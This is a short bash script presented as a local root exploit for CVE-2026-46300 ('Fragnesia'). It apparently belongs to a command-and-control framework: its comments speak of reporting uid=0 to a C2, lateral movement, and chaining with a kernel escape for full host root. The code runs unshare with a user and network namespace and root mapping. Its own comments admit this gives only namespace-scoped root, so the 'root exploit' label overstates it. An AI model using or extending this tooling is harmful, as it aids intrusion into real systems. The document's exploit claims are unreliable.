#!/bin/bash
# ================================================
# CVE-2026-46300 - Fragnesia Local Root Exploit
# User + Network Namespace Privilege Escalation
# ================================================
#
# Technique : unshare(CLONE_NEWUSER | CLONE_NEWNET) maps the invoking UID
# to root (UID 0) inside the new namespace. The agent spawned from within
# the namespace reports uid=0 to the C2 while running as the real user on
# the host — sufficient for namespace-scoped operations and lateral movement.
#
# Limitations : root is namespace-scoped only. SUID binaries planted inside
# the namespace do not grant host root (owned by real user, not UID 0 on host).
# Combine with a kernel escape (e.g. dirtyfrag) for full host root.
#
# Requirements : util-linux (unshare), kernel CONFIG_USER_NS=y (default on
# most distros). No root, no SUID binary required to invoke.

if [[ $EUID -eq 0 ]]; then
    echo "[privesc:fail] fragnesia — already root"
    exit 1
fi

if ! command -v unshare &>/dev/null; then
    echo "[privesc:fail] fragnesia — unshare not found (install util-linux)"
    exit 1
fi

unshare --user --map-root-user --net -- bash -c '
    ip link set lo up 2>/dev/null || true
    echo "[privesc:ok] fragnesia"
    id
' 2>&1 || echo "[privesc:fail] fragnesia — unshare failed (kernel CONFIG_USER_NS disabled?)"
